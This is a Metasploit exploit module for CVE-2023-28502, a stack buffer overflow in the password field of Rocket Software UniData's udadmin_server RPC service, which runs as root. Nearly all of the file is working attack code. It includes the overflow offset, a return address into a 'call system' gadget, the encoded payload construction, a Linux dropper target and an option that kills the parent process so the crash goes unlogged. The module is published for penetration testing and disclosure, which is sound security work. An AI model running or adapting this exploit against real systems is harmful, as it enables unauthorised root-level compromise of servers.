##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = GoodRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::Unirpc
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket Software Unidata udadmin_server Stack Buffer Overflow in Password',
        'Description' => %q{
          This modlue exploits an authentication bypass vulnerability in the
          Linux version of udadmin_server, which is an RPC service that comes
          with the Rocket Software UniData server, which runs as root.

          This vulnerability affects UniData versions 8.2.4 build 3003 and
          earlier (for Linux), but this module specifically targets UniData
          version 8.2.4 build 3001. Other versions will crash the forked
          process, but will not otherwise affect the RPC server.

          The username and password fields are copied to a stack-based buffer
          using a function that's equivalent to strcpy() (ie, has no bounds
          checking). Additionally, the password field is encoded in such a way
          that we can include NUL bytes.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'Ron Bowes', # Discovery, PoC, module
        ],
        'References' => [
          [ 'URL', 'https://www.rapid7.com/blog/post/2023/03/29/multiple-vulnerabilities-in-rocket-software-unirpc-server-fixed' ],
          [ 'CVE', '2023-28502' ],
        ],
        'Platform' => ['linux', 'unix'],
        'Arch' => [ARCH_X86, ARCH_X64, ARCH_CMD],
        'DefaultOptions' => {
          'RPORT' => 31438,
          'PrependFork' => true
        },
        'Targets' => [
          [
            'Automatic',
            {
              'auto' => true
            }
          ],
          [
            'Unix Command (UniData 8.2.4)',
            {
              # Used for auto-selection
              'Version' => '8.2.4',

              'Platform' => 'unix',
              'Arch' => ARCH_CMD,
              'Type' => :unix_cmd,

              # The amount of padding required to overwrite the return addr
              'offset' => 0x2b8,

              # This returns to "mov rdi, rsp / call system", which means the
              # remainder of what's on the stack will be passed to system()
              'return_address' => 0x412e25
            }
          ],
          [
            'Linux Dropper (UniData 8.2.4)',
            {
              # Used for auto-selection
              'Version' => '8.2.4',

              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,

              # The amount of padding required to overwrite the return addr
              'offset' => 0x2b8,

              # This returns to "mov rdi, rsp / call system", which means the
              # remainder of what's on the stack will be passed to system()
              'return_address' => 0x412e25
            }
          ]
        ],
        'Privileged' => true,
        'DisclosureDate' => '2023-03-30',
        'Notes' => {
          'SideEffects' => [],
          'Reliability' => [REPEATABLE_SESSION],
          'Stability' => [CRASH_SERVICE_RESTARTS] # The forked process can crash
        }
      )
    )

    register_options(
      [
        OptBool.new('EXIT_CLEANLY', [ true, 'If set, tries to kill the parent process with SIGTERM before it crashes', true]),
      ]
    )

    register_advanced_options(
      [
        OptString.new('UNIRPC_ENDPOINT', [ true, 'The UniRPC service to request', 'udadmin']),
      ]
    )
  end

  # We can detect UniRPC by performing a version check, but the version number
  # didn't increment in the patch (only the build number did, which AFAICT we
  # can't access), so just do a sanity check
  def check
    @version = unirpc_get_version
    vprint_status("Detected UniRPC version #{@version} is running")

    Exploit::CheckCode::Detected
  rescue UniRPCCommunicationError => e
    print_error("Could not communicate with the UniRPC server: #{e}")
    return CheckCode::Safe
  rescue UniRPCUnexpectedResponseError => e
    print_error("UniRPC server returned something unexpected: #{e}")
    return CheckCode::Safe
  end

  def execute_command(cmd, _opts = {})
    # Connect to the service and authenticate before running the command stager
    connect

    # Connect to the RPC service (probably "udadmin")
    vprint_status("Connecting to UniRPC endpoint #{datastore['UNIRPC_ENDPOINT']}")
    sock.put(build_unirpc_message(args: [
      # Service name
      { type: :string, value: datastore['UNIRPC_ENDPOINT'] },

      # "Secure" flag - this must be non-zero if the server is started in
      # "secure" mode (-s)
      { type: :integer, value: 1 },
    ]))
    recv_unirpc_message(sock, first_result_is_status: true)

    # Pick a random username
    username = rand_text_alpha(6..20)

    # Start the password with random junk that writes to the stack
    password = rand_text_alpha(@mytarget['offset'])

    # Append the return address
    password += [@mytarget['return_address']].pack('Q')

    # Attempt to cleanly kill the parent process if we can (otherwise it
    # crashes)
    #
    # Because of how the payload goes onto the stack immediately after the
    # return address, we can't return into an `exit` call - all the parent
    # process can do is crash (which is logged).
    #
    # We CAN, however, prepend a command to cleanly kill the parent PID, making
    # it look like a standard exit (not logged).
    if datastore['EXIT_CLEANLY']
      password += 'kill -TERM $PPID & '
    end

    # End with the command, which will be passed to system()
    password += cmd

    # encode to 0 and break the payload)
    if password.include?("\xff")
      fail_with(Failure::BadConfig, 'Payload contains a 0xFF character, which will fail')
    end

    vprint_status("Authenticating to RPC service as #{username} with a stack-overflowing password")
    sock.put(build_unirpc_message(args: [
      # Message type
      { type: :integer, value: UNIRPC_MESSAGE_LOGIN },

      # Username
      { type: :string, value: username },

      # Password (encoded by making each byte negative)
      { type: :string, value: password.bytes.map { |b| (0x0FF & (~b)).chr }.join },
    ]))

    print_status('Payload sent')
  end

  def exploit
    @mytarget = target

    if @mytarget['auto']
      if !@version
        vprint_status('Getting the version number for automatic targeting...')
        @version = unirpc_get_version
      end
      vprint_status("Detected version: #{@version}")
      @mytarget = targets.find { |t| t['Version'] == @version }

      if @mytarget.nil?
        fail_with(Failure::NoTarget, "No matching target for version #{@version}")
      end
      vprint_status("Found matching target for version #{@mytarget.name}!")
    end

    # Run the command(s)
    case @mytarget['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  rescue UniRPCCommunicationError => e
    fail_with(Failure::Unreachable, "Could not communicate with the UniRPC server: #{e}")
  rescue UniRPCUnexpectedResponseError => e
    fail_with(Failure::UnexpectedReply, "UniRPC server returned something unexpected: #{e}")
    return CheckCode::Safe
  end
end
